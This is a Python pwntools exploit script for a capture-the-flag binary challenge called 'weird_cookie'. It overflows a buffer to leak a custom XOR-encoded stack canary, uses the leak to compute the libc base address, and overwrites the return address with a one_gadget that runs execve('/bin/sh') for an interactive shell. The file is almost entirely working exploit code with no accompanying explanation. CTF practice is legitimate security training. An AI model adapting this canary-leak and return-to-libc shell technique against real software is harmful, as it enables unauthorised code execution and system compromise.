#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './weird_cookie'
elf = context.binary = ELF(exe, checksec=True)
libc = ELF('libc-2.27.so', checksec=False)
rop = ROP(exe)
context.log_level = 'debug'
host = 'challenge.nahamcon.com'
port = 30170

def start(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
b *main+153
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = start()

offset = 40
custom_canary = 0x123456789abcdef1 # which then will be XORed with printf address and stored on memory

'''
>> one_gadget libc-2.27.so

0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

# leaking canary
io.sendafter(b'overflow me?', b'a'*39 + b'i')

# receiving and formatting custom canary and libc printf
io.recvuntil(b'i')
canary = unpack(io.recv(8).ljust(8, b'\x00'))
printf = canary ^ custom_canary
libc.address = printf - libc.sym['printf']
info('custom canary: %#x', canary)
info('glibc printf: %#x', printf)

# flattening  payload here
payload = flat({
    offset: [
        canary,                 # Custom Canary
        0,                      # RBP junk
        libc.address + 0x10a2fc  # trying one_gadget one by one
    ]
})

# sending payload
io.sendafter(b'Try again', payload)

io.interactive()